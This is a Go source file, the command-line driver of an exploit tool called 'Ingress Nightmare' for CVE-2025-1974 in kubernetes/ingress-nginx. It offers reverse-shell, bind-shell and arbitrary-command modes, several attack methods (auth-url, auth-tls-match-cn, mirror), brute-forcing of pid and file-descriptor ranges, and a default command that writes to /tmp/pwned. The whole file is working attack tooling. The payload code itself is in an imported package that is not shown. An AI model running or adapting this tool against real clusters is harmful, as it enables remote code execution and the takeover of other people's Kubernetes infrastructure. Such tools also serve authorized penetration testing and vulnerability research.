package main

import (
	"fmt"
	"net"
	"os"
	"strings"

	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	nginx_ingress "ingressnightmare/nginx-ingress"
)

var Opts = struct {
	Mode              string
	IngressWebhookUrl string
	UploadUrl         string
	Verbose           int
	DryRun            bool

	ReverseShellIp   net.IP
	ReverseShellPort uint16

	BindShellPort uint16

	Command string

	PidRangeStart int
	PidRangeEnd   int
	FdRangeStart  int
	FdRangeEnd    int

	OnlyAdmission         bool
	OnlyAdmissionFilePath string
	OnlyUpload            bool

	nginx_ingress.ExploitMethod
}{}

func defaultPodIp() net.IP {
	interfaces, _ := net.Interfaces()
	for _, i := range interfaces {
		if i.Name == "eth0" {
			addrs, _ := i.Addrs()
			if addrs != nil || len(addrs) > 0 {
				ip := strings.Split(addrs[0].String(), "/")[0]
				return net.ParseIP(ip)
			}
		}
	}
	return net.ParseIP("10.0.0.1")
}

func init() {
	ExpCmd.Flags().StringVarP(&Opts.Mode, "mode", "m", "", "mode reverse-shell(r)/bind-shell(b)/command(c)")
	_ = ExpCmd.MarkFlagRequired("mode")
	ExpCmd.Flags().StringVarP(&Opts.IngressWebhookUrl, "ingress-webhook-url", "i",
		"https://ingress-nginx-controller-admission.ingress-nginx.svc.cluster.local:443",
		"ingress webhook url")
	ExpCmd.Flags().StringVarP(&Opts.UploadUrl, "upload-url", "u",
		"http://ingress-nginx-controller.ingress-nginx.svc.cluster.local:80",
		"upload url")

	ExpCmd.Flags().BoolVarP(&Opts.IsAuthURL, "is-auth-url", "a", true, "using auth-url to attack (default)")
	ExpCmd.Flags().BoolVarP(&Opts.IsAuthTLSMatchCN, "is-match-cn", "A", false, "using auth-tls-match-cn to attack (not default)")
	ExpCmd.Flags().StringVarP(&Opts.AuthSecret, "auth-secret-name", "U", "", "if using auth-tls-match-cn, secret name is required, example: kube-system/cilium-ca")
	ExpCmd.Flags().BoolVarP(&Opts.IsMirrorWithUID, "is-mirror-with-uid", "M", false, "using mirror with uid")

	ExpCmd.Flags().IPVarP(&Opts.ReverseShellIp, "reverse-shell-ip", "r", defaultPodIp(), "reverse shell ip")
	ExpCmd.Flags().Uint16VarP(&Opts.ReverseShellPort, "reverse-shell-port", "p", 0, "reverse shell port")
	ExpCmd.Flags().Uint16VarP(&Opts.BindShellPort, "bind-shell-port", "b", 0, "bind shell port")
	ExpCmd.Flags().StringVarP(&Opts.Command, "command", "c", "", "command")

	ExpCmd.PersistentFlags().CountVarP(&Opts.Verbose, "verbose", "v", "verbose output")
	ExpCmd.PersistentFlags().BoolVarP(&Opts.DryRun, "dry-run", "d", false, "dry run and dump payload")

	ExpCmd.Flags().BoolVarP(&Opts.OnlyAdmission, "only-admission", "o", false, "only admission")
	ExpCmd.Flags().StringVarP(&Opts.OnlyAdmissionFilePath, "only-admission-file", "f", "", "only admission file")
	ExpCmd.Flags().BoolVarP(&Opts.OnlyUpload, "only-upload", "O", false, "only upload")

	ExpCmd.Flags().IntVarP(&Opts.PidRangeStart, "pid-range-start", "S", 5, "pid range start")
	ExpCmd.Flags().IntVarP(&Opts.PidRangeEnd, "pid-range-end", "E", 40, "distance to pid range end")
	ExpCmd.Flags().IntVarP(&Opts.FdRangeStart, "fd-range-start", "s", 3, "fd range start")
	ExpCmd.Flags().IntVarP(&Opts.FdRangeEnd, "fd-range-end", "e", 26, "distance fd range end")
}

func boolCounts(flags ...bool) int {
	value := 0
	for _, flag := range flags {
		if flag {
			value++
		}
	}
	return value
}

var ExpCmd = &cobra.Command{
	Use:   "ingress-nightmare",
	Short: "Ingress Nightmare is a tool to exploit kubernetes/ingress-nginx",
	Long: "Ingress Nightmare is a tool to exploit kubernetes/ingress-nginx, Thanks to Wiz amazing research." +
		" CVE-2025-1974, https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities#how-did-we-discover-ingressnightmare-24",
	PersistentPreRun: func(cmd *cobra.Command, args []string) {
		logLevel := log.InfoLevel
		if Opts.Verbose >= 2 {
			logLevel = log.TraceLevel
			nginx_ingress.Verbose = true
		} else if Opts.Verbose == 1 {
			logLevel = log.DebugLevel
		}
		log.SetLevel(logLevel)
		log.SetOutput(os.Stderr)
		nginx_ingress.Init()
	},
	Run: func(cmd *cobra.Command, args []string) {
		if Opts.AuthSecret != "" {
			Opts.IsAuthTLSMatchCN = true
			Opts.IsAuthURL = false
			Opts.IsMirrorWithUID = false
		}
		if Opts.IsAuthTLSMatchCN && Opts.AuthSecret == "" {
			log.Fatal("auth-secret-name is required when using auth-tls-match-cn")
		}
		if Opts.IsMirrorWithUID {
			Opts.IsAuthURL = false
			Opts.IsAuthTLSMatchCN = false
		}
		if boolCounts(Opts.IsMirrorWithUID, Opts.IsAuthURL, Opts.IsAuthTLSMatchCN) != 1 {
			log.Fatal("is-auth-url, is-auth-tls-match-cn, is-mirror-with-uid are three different exploit method, only one can be selected")
		}
		err := nginx_ingress.RenderValidateJSON(Opts.ExploitMethod)
		if err != nil {
			log.Fatalf("error validating exploit method: %v", err)
		}
		if Opts.OnlyAdmission {
			if Opts.OnlyAdmissionFilePath == "" {
				log.Fatal("only-admission-file is required")
			}
			if Opts.DryRun {
				log.Infoln("dry-run mode, payload:")
				_, _ = os.Stdout.Write([]byte(strings.ReplaceAll(nginx_ingress.ValidateJson(), "foobar", Opts.OnlyAdmissionFilePath)))
				return
			}
			nginx_ingress.OnlyAdmissionRequest(Opts.IngressWebhookUrl, Opts.OnlyAdmissionFilePath)
			return
		}

		var payload nginx_ingress.Payload
		switch Opts.Mode {
		case "reverse-shell", "r":
			payload = nginx_ingress.NewReverseShellPayload(Opts.ReverseShellIp.String(), fmt.Sprintf("%d", Opts.ReverseShellPort))
		case "bind-shell", "b":
			payload = nginx_ingress.NewBindShellPayload(fmt.Sprintf("%d", Opts.BindShellPort))
		case "command", "c":
			payload = nginx_ingress.NewCommandPayload(Opts.Command)
		default:
			payload = nginx_ingress.NewCommandPayload("id > /tmp/pwned")
		}
		log.Infof("Constructed payload successfully")
		if Opts.OnlyUpload {
			nginx_ingress.OnlyUplaoder(Opts.UploadUrl, payload)
			return
		}
		if Opts.DryRun {
			log.Infoln("dry-run mode, payload:")
			_, _ = os.Stdout.Write(payload)
			return
		}
		log.Tracef("mode chosen: %s", Opts.Mode)
		nginx_ingress.Exploit(
			Opts.IngressWebhookUrl, Opts.UploadUrl, payload,
			Opts.FdRangeStart, Opts.PidRangeStart, Opts.FdRangeEnd, Opts.PidRangeEnd,
		)
	},
}

func main() {
	if err := ExpCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
